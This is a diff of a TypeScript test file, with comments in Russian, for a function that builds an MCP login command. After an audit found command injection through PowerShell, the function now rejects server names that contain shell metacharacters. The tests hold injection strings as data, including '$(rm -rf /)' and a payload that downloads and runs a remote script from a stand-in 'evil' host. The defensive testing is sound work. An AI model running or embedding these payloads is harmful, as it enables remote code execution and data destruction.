@@ -5,6 +5,7 @@ import {
   hostOf,
   markIndex,
   mcpLoginCommand,
+  shellSafeName,
   mcpToolFullName,
   mcpRowFrom,
   sortMcpRows
@@ -144,10 +145,42 @@ describe('команда для входа обязана работать пр�
     expect(mcpLoginCommand('claude.ai Notion')).toBe('claude mcp login "claude.ai Notion"')
   })
 
-  it('кавычки и подстановки внутри имени экранируются', () => {
-    expect(mcpLoginCommand('a"b')).toBe('claude mcp login "a\\"b"')
-    expect(mcpLoginCommand('$(rm -rf /)')).toBe('claude mcp login "\\$(rm -rf /)"')
-    expect(mcpLoginCommand('back\\slash')).toBe('claude mcp login "back\\\\slash"')
+  /*
+   * НАХОДКА АУДИТА 2026-08-04. Раньше «опасное» имя заворачивалось в кавычки с
+   * экранированием по правилам sh — а копируют команду в PowerShell, где
+   * обратный слэш не экранирует НИЧЕГО: `\"` там просто закрывает строку, и
+   * хвост исполняется как отдельная команда. Имя сервера приходит из
+   * `.mcp.json` ОТКРЫТОГО ПРОЕКТА, то есть это чужой текст — получалось
+   * выполнение кода из чужого файла по кнопке, обещавшей «честный ручной путь».
+   *
+   * Экранирования, годного сразу для sh, PowerShell и cmd, не существует.
+   * Поэтому команды для таких имён просто НЕТ, а интерфейс говорит об этом.
+   */
+  it('имя с метасимволами команды не даёт вовсе', () => {
+    expect(mcpLoginCommand('a"b')).toBeNull()
+    expect(mcpLoginCommand('$(rm -rf /)')).toBeNull()
+    expect(mcpLoginCommand('back\\slash')).toBeNull()
+    // Ровно тот случай из аудита: закрывающая кавычка, своя команда и `#`,
+    // съедающий хвост, чтобы не осталось следа.
+    expect(mcpLoginCommand('docs";iwr http://evil/a.ps1|iex;#')).toBeNull()
+    expect(mcpLoginCommand('a`b')).toBeNull()
+    expect(mcpLoginCommand('a;b')).toBeNull()
+    expect(mcpLoginCommand('a|b')).toBeNull()
+    expect(mcpLoginCommand('a\nb')).toBeNull()
+  })
+
+  it('пробелы по краям и слишком длинное имя тоже отвергаются', () => {
+    expect(mcpLoginCommand(' docs')).toBeNull()
+    expect(mcpLoginCommand('docs ')).toBeNull()
+    expect(mcpLoginCommand('x'.repeat(121))).toBeNull()
+  })
+
+  it('shellSafeName пропускает обычные имена и режет остальные', () => {
+    expect(shellSafeName('context7')).toBe(true)
+    expect(shellSafeName('claude.ai Notion')).toBe(true)
+    expect(shellSafeName('plugin:cloudflare:builds')).toBe(true)
+    expect(shellSafeName('a&b')).toBe(false)
+    expect(shellSafeName('')).toBe(false)
   })
 })
 
